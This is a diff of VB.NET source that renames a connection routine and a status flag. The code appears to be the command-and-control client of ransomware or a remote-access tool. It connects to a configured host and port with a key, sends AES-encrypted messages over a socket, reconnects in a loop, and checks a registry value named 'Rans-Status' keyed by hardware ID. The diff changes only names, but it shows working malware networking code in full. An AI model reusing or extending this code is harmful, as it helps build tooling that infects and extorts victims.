@@ -5,7 +5,7 @@ Public Class Main
 
 
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
+    Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
 
         KEY = K
         HOST = H
@@ -19,7 +19,7 @@ Public Class Main
 
         Dim lp As Integer = 0
 
-        CN = False
+        Alive = False
         Try
             C.Client.Disconnect(False)
         Catch ex As Exception
@@ -39,7 +39,7 @@ Public Class Main
             C.Client.ReceiveBufferSize = 999999
             lp = 0
             C.Client.Connect(H, P)
-            CN = True
+            Alive = True
             Try
 
                 Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", Nothing)
@@ -58,7 +58,7 @@ re:
         Try
             If C Is Nothing Then GoTo cc
             If C.Client.Connected = False Then GoTo cc
-            If CN = False Then GoTo cc
+            If Alive = False Then GoTo cc
             lp += 1
             If lp > 500 Then
                 lp = 0
@@ -141,7 +141,7 @@ cc:
     End Function
 
     Public Shared Sub Send(ByVal b As Byte())
-        If CN = False Then Exit Sub
+        If Alive = False Then Exit Sub
         Try
             Dim r As Object = New IO.MemoryStream
             r.Write(b, 0, b.Length)
@@ -149,7 +149,7 @@ cc:
             C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
             r.Dispose()
         Catch ex As Exception
-            CN = False
+            Alive = False
         End Try
     End Sub
 
@@ -157,7 +157,7 @@ cc:
         Send(SB(AES_Encrypt(S)))
     End Sub
 
-    Public Shared CN As Boolean = False
+    Public Shared Alive As Boolean = False
 
     Public Shared Function SB(ByVal s As String) As Byte()
         Return Text.Encoding.Default.GetBytes(s)
